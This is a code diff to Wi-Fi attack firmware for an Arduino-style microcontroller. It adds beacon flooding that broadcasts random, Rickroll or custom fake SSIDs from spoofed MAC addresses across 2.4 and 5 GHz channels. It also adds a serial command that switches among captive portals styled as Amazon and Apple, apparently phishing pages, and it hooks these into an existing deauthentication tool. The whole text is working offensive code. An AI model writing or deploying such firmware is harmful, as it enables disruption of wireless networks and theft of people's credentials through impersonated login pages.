@@ -26,6 +26,9 @@ TaskHandle_t wifiRunning = NULL;
 
 #define MAX_TASKS 5
 
+bool randomBeaconActive = false;
+bool rickrollBeaconActive = false;
+TaskHandle_t beaconFloodTask = NULL;
 
 typedef struct {
   TaskHandle_t handle;
@@ -74,6 +77,27 @@ String sep = String(char(0x1D));
 
 String end = String(char(0x03));
 
+const char* rickroll_ssids[] = {
+    "01 Never gonna give you up",
+    "02 Never gonna let you down", 
+    "03 Never gonna run around",
+    "04 and desert you",
+    "05 Never gonna make you cry",
+    "06 Never gonna say goodbye",
+    "07 Never gonna tell a lie",
+    "08 and hurt you"
+};
+
+// Channel arrays for beacon flooding
+int beacon_channels_2g[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
+int beacon_channels_5g[] = {36, 40, 44, 48, 149, 153, 157, 161};
+
+
+TaskHandle_t customBeaconTask = NULL;
+String customBeaconSSID = "";
+bool customBeaconActive = false;
+
+
 String printEncryptionTypeEx(uint32_t thisType) {
   /*  Arduino wifi api use encryption type to mapping to security type.
    *  This function demonstrate how to get more richful information of security type.
@@ -114,7 +138,16 @@ String printEncryptionTypeEx(uint32_t thisType) {
   return "Unknown";
 }
 
-
+String generateRandomString(int len) {
+    String randstr = "";
+    const char setchar[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    
+    for (int i = 0; i < len; i++) {
+        int index = random(0, strlen(setchar));
+        randstr += setchar[index];
+    }
+    return randstr;
+}
 
 
 rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
@@ -144,7 +177,9 @@ void scanNetworks(void *pvParameters) {
       delete (int*)pvParameters; // free memory after use
   }
 
-  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
+  DEBUG_SER_PRINT("Scanning WiFi networks (");
+  DEBUG_SER_PRINT(time_ms / 1000);
+  DEBUG_SER_PRINTLN("s)...");
   //prevTime = currentTime;
   digitalWrite(LED_R, LOW);
   digitalWrite(LED_G, HIGH);
@@ -297,6 +332,202 @@ int cmd_scan(){
   return 0;
 }
 
+
+void beaconFloodTask_func(void *pvParameters) {
+    int mode = *((int*)pvParameters);
+    delete (int*)pvParameters;
+    
+    uint8_t fake_mac[6];
+    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    int rickroll_index = 0;
+    
+    // Store MAC addresses for Rick roll SSIDs to keep them consistent
+    uint8_t rickroll_macs[8][6]; // 8 Rick roll SSIDs, 6 bytes each for MAC
+    bool rickroll_macs_initialized = false;
+    
+    // Initialize Rick roll MAC addresses once
+    if (mode == 2 && !rickroll_macs_initialized) {
+        for (int i = 0; i < 8; i++) {
+            // Generate consistent MAC for each Rick roll SSID based on SSID content
+            String ssid = rickroll_ssids[i];
+            uint32_t hash = stringHash(ssid);
+            
+            for (int j = 0; j < 6; j++) {
+                rickroll_macs[i][j] = (hash + j) & 0xFF;
+                hash = hash >> 8;
+            }
+            rickroll_macs[i][0] &= 0xFE; // Ensure unicast address
+            rickroll_macs[i][0] |= 0x02; // Set locally administered bit
+        }
+        rickroll_macs_initialized = true;
+    }
+    
+    while (true) {
+        String ssid;
+        int channel;
+        
+        if (mode == 1) { // Random beacon mode
+            // Generate random MAC for each random beacon
+            for (int i = 0; i < 6; i++) {
+                fake_mac[i] = random(0x00, 0xFF);
+            }
+            fake_mac[0] &= 0xFE; // Ensure unicast address
+            fake_mac[0] |= 0x02; // Set locally administered bit
+            
+            // Generate random SSID
+            ssid = generateRandomString(random(8, 32));
+            
+            // Random channel selection (mix 2.4GHz and 5GHz)
+            if (random(0, 2) == 0) {
+                channel = beacon_channels_2g[random(0, 11)];
+            } else {
+                channel = beacon_channels_5g[random(0, 8)];
+            }
+            
+        } else if (mode == 2) { // Rick roll mode
+            // Use the pre-generated MAC for this specific Rick roll SSID
+            memcpy(fake_mac, rickroll_macs[rickroll_index], 6);
+            
+            ssid = rickroll_ssids[rickroll_index];
+            rickroll_index = (rickroll_index + 1) % 8;
+            
+            // Cycle through 2.4GHz channels for rick roll
+            channel = beacon_channels_2g[random(0, 11)];
+        }
+        
+        // Set channel and transmit beacon
+        wext_set_channel(WLAN0_NAME, channel);
+        wifi_tx_beacon_frame(fake_mac, broadcast_mac, ssid.c_str());
+        
+        // LED indication
+        digitalWrite(LED_G, !digitalRead(LED_G));
+        
+        // Delay between beacons (adjust as needed)
+        vTaskDelay(10 / portTICK_PERIOD_MS);
+    }
+}
+
+uint32_t stringHash(const String& str) {
+  uint32_t hash = 5381;
+  for (unsigned int i = 0; i < str.length(); i++) {
+      hash = ((hash << 5) + hash) + str.charAt(i);
+  }
+  return hash;
+}
+
+void customBeaconTask_func(void *pvParameters) {
+    String* ssid_ptr = (String*)pvParameters;
+    String ssid = *ssid_ptr;
+    delete ssid_ptr; // Clean up allocated memory
+    
+    uint8_t fake_mac[6];
+    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    
+    DEBUG_SER_PRINT("Broadcasting custom beacon with random MACs: ");
+    DEBUG_SER_PRINTLN(ssid);
+    
+    while (true) {
+        // Generate random MAC address for each beacon
+        for (int i = 0; i < 6; i++) {
+            fake_mac[i] = random(0x00, 0xFF);
+        }
+        fake_mac[0] &= 0xFE; // Ensure unicast address
+        fake_mac[0] |= 0x02; // Set locally administered bit
+        
+        // Random channel selection (mix 2.4GHz and 5GHz like random beacon)
+        int channel;
+        if (random(0, 2) == 0) {
+            channel = beacon_channels_2g[random(0, 11)];
+        } else {
+            channel = beacon_channels_5g[random(0, 8)];
+        }
+        
+        // Set channel and transmit beacon
+        wext_set_channel(WLAN0_NAME, channel);
+        //wifi_tx_beacon_frame(fake_mac, broadcast_mac, ssid.c_str());
+        wifi_tx_encrypted_beacon_frame(fake_mac, broadcast_mac, ssid.c_str(), channel);
+        
+        // LED indication
+        digitalWrite(LED_B, !digitalRead(LED_B));
+        
+        // Delay between beacons (same as random beacon)
+        vTaskDelay(10 / portTICK_PERIOD_MS);
+    }
+}
+
+int cmd_beacon() {
+    if (dataArray[0] == 's') {
+        // Stop beacon flooding
+        DEBUG_SER_PRINTLN("Stopping beacon flood...");
+        if (beaconFloodTask != NULL) {
+            vTaskDelete(beaconFloodTask);
+            beaconFloodTask = NULL;
+            randomBeaconActive = false;
+            rickrollBeaconActive = false;
+            digitalWrite(LED_G, LOW);
+        }
+    } else if (dataArray[0] == 'r') {
+        // Random beacon flooding
+        DEBUG_SER_PRINTLN("Starting random beacon flood...");
+        if (beaconFloodTask == NULL) {
+            int* mode = new int(1);
+            xTaskCreate(beaconFloodTask_func, "beaconFlood", 2048, (void*)mode, 1, &beaconFloodTask);
+            randomBeaconActive = true;
+        }
+    } else if (dataArray[0] == 'k') {
+        // Rick roll beacon flooding  
+        DEBUG_SER_PRINTLN("Starting rickroll beacon flood...");
+        if (beaconFloodTask == NULL) {
+            int* mode = new int(2);
+            xTaskCreate(beaconFloodTask_func, "beaconFlood", 2048, (void*)mode, 1, &beaconFloodTask);
+            rickrollBeaconActive = true;
+        }
+    } else if (dataArray[0] == 'c') {
+        // Custom SSID beacon
+        // Extract custom SSID from dataArray (after 'c')
+        String custom_ssid = "";
+        for (int i = 1; i < numReceived - 1; i++) {
+            custom_ssid += (char)dataArray[i];
+        }
+        
+        if (custom_ssid.length() > 0 && custom_ssid.length() <= 32) {
+            DEBUG_SER_PRINT("Starting custom beacon: ");
+            DEBUG_SER_PRINTLN(custom_ssid);
+            
+            // Stop any existing beacon tasks first
+            if (beaconFloodTask != NULL) {
+                vTaskDelete(beaconFloodTask);
+                beaconFloodTask = NULL;
+                randomBeaconActive = false;
+                rickrollBeaconActive = false;
+            }
+            if (customBeaconTask != NULL) {
+                vTaskDelete(customBeaconTask);
+                customBeaconTask = NULL;
+            }
+            
+            // Start custom beacon task
+            String* ssid_ptr = new String(custom_ssid);
+            xTaskCreate(customBeaconTask_func, "customBeacon", 2048, (void*)ssid_ptr, 1, &customBeaconTask);
+            customBeaconActive = true;
+            customBeaconSSID = custom_ssid;
+            
+      } else {
+          DEBUG_SER_PRINTLN("Invalid SSID length (must be 1-32 characters)");
+      }
+    }
+    return 0;
+}
+
+
+
+
+
+
+
+
+
+
 /*
 void printFreeHeap() {
     size_t freeHeap = xPortGetFreeHeapSize();
@@ -409,7 +640,39 @@ bool isNetworkIndexInUse(int index) {
   return false;  // Safe to use
 }
 
-
+int cmd_portal() {
+    if (wifiRunning == NULL) {
+        DEBUG_SER_PRINTLN("WiFi server is not running. Start WiFi first.");
+        return 1;
+    }
+    
+    char portal_type = dataArray[0];
+    WebPortalType newPortal;
+    
+    switch (portal_type) {
+        case '1':
+            newPortal = DefaultPortal;
+            DEBUG_SER_PRINTLN("Switching to Default portal");
+            break;
+        case '2':
+            newPortal = AmazonPortal;
+            DEBUG_SER_PRINTLN("Switching to Amazon portal");
+            break;
+        case '3':
+            newPortal = ApplePortal;
+            DEBUG_SER_PRINTLN("Switching to Apple portal");
+            break;
+        default:
+            DEBUG_SER_PRINTLN("Invalid portal type. Use 1-4.");
+            return 1;
+    }
+    
+    // Change the current portal
+    currentPortal = newPortal;
+    DEBUG_SER_PRINTLN("Portal changed successfully!");
+    
+    return 0;
+}
 
 
 void createNewDeauthTask(int index, int reason) {
@@ -553,6 +816,7 @@ void read_line(){
         cmd_deauth();
         break;
       case 'w':
+      {
         DEBUG_SER_PRINTLN("Wifi");
 
         char data1 = receivedBytes[1];
@@ -575,8 +839,15 @@ void read_line(){
             cmd_wifi(0);
             break;
         }
-
-
+        break;
+      }
+      case 'b':
+        DEBUG_SER_PRINTLN("Beacon");
+        cmd_beacon();
+        break;
+      case 'p':
+        DEBUG_SER_PRINTLN("Portal Change");
+        cmd_portal();
         break;
     }
 
